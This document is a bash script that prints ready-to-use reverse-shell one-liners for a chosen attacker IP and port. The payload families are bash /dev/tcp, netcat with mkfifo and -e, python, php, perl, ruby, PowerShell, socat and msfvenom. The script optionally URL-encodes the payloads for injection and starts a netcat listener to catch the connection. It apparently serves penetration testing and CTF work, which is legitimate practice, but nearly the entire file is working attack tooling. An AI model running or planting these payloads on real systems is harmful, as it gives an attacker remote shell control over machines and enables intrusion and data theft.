#!/usr/bin/env bash
#
# revshell.sh
#
# Print reverse-shell one-liners for a given LHOST/LPORT, optionally URL-encoded,
# and optionally start the matching listener. A local stand-in for revshells.com.
#
# Usage:
#   ./revshell.sh -i 10.10.14.5 -p 4444           # all payloads
#   ./revshell.sh -i tun0 -p 4444                 # resolve LHOST from an interface
#   ./revshell.sh -i tun0 -p 4444 --type python   # one payload family
#   ./revshell.sh -i tun0 -p 4444 --url-encode    # also print URL-encoded
#   ./revshell.sh -i tun0 -p 4444 --listen        # start a netcat listener
#
# Types: bash, sh, nc, python, php, perl, ruby, powershell, socat, msfvenom
#
set -uo pipefail

LHOST=""
LPORT=""
TYPE="all"
URLENC=0
LISTEN=0

die()  { echo "ERROR: $*" >&2; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

usage() {
  grep '^#' "$0" | sed 's/^# \{0,1\}//' | sed '/^!/d'
  exit "${1:-0}"
}

# Turn an interface name into its IPv4; pass an IP through unchanged.
resolve_lhost() {
  local v="$1"
  if [ -d "/sys/class/net/$v" ]; then
    ip -4 -o addr show "$v" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1
  else
    echo "$v"
  fi
}

urlencode() {
  local s="$1" i c out="" hex
  for (( i=0; i<${#s}; i++ )); do
    c="${s:i:1}"
    case "$c" in
      [a-zA-Z0-9.~_-]) out+="$c" ;;
      *) printf -v hex '%%%02X' "'$c"; out+="$hex" ;;
    esac
  done
  printf '%s' "$out"
}

# --- parse args -----------------------------------------------------------
while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)      usage 0 ;;
    -i|--lhost)     shift; [ $# -gt 0 ] || die "--lhost needs a value"; LHOST="$1" ;;
    --lhost=*)      LHOST="${1#*=}" ;;
    -p|--lport)     shift; [ $# -gt 0 ] || die "--lport needs a value"; LPORT="$1" ;;
    --lport=*)      LPORT="${1#*=}" ;;
    -t|--type)      shift; [ $# -gt 0 ] || die "--type needs a value"; TYPE="$1" ;;
    --type=*)       TYPE="${1#*=}" ;;
    --url-encode)   URLENC=1 ;;
    --listen)       LISTEN=1 ;;
    *)              die "Unknown option: $1 (try --help)" ;;
  esac
  shift
done

[ -n "$LHOST" ] || { echo "No LHOST (-i) given." >&2; usage 2; }
[ -n "$LPORT" ] || { echo "No LPORT (-p) given." >&2; usage 2; }

RAW_LHOST="$LHOST"
LHOST=$(resolve_lhost "$LHOST")
[ -n "$LHOST" ] || die "Could not resolve an IPv4 address for '$RAW_LHOST'."

echo ">> LHOST: $LHOST   LPORT: $LPORT"
[ "$RAW_LHOST" != "$LHOST" ] && echo ">> (resolved from interface '$RAW_LHOST')"
echo

# --- payload table (name|payload) -----------------------------------------
PAYLOADS=(
  "bash|bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1"
  "bash|0<&196;exec 196<>/dev/tcp/${LHOST}/${LPORT}; sh <&196 >&196 2>&196"
  "sh|sh -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1"
  "nc|rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f"
  "nc|nc -e /bin/sh ${LHOST} ${LPORT}"
  "python|python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"${LHOST}\",${LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn(\"/bin/bash\")'"
  "php|php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
  "perl|perl -e 'use Socket;\$i=\"${LHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
  "ruby|ruby -rsocket -e'f=TCPSocket.open(\"${LHOST}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
  "powershell|powershell -nop -c \"\$c=New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sby=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sby,0,\$sby.Length);\$s.Flush()}\""
  "socat|socat TCP:${LHOST}:${LPORT} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"
  "msfvenom|msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf"
  "msfvenom|msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o shell.exe"
)

# --- print ----------------------------------------------------------------
printed=0
for entry in "${PAYLOADS[@]}"; do
  name="${entry%%|*}"; payload="${entry#*|}"
  if [ "$TYPE" != "all" ] && [ "$TYPE" != "$name" ]; then continue; fi
  printf '# %s\n%s\n' "$name" "$payload"
  if [ "$URLENC" -eq 1 ]; then
    printf '# %s (url-encoded)\n%s\n' "$name" "$(urlencode "$payload")"
  fi
  echo
  printed=$((printed+1))
done

[ "$printed" -gt 0 ] || die "No payloads matched --type '$TYPE'."

# --- optional listener ----------------------------------------------------
if [ "$LISTEN" -eq 1 ]; then
  echo ">> Starting listener on port ${LPORT} (Ctrl-C to stop)..."
  if have rlwrap && have nc; then
    exec rlwrap nc -lvnp "$LPORT"
  elif have nc; then
    exec nc -lvnp "$LPORT"
  elif have ncat; then
    exec ncat -lvnp "$LPORT"
  else
    die "No nc/ncat found for the listener. Install netcat."
  fi
fi
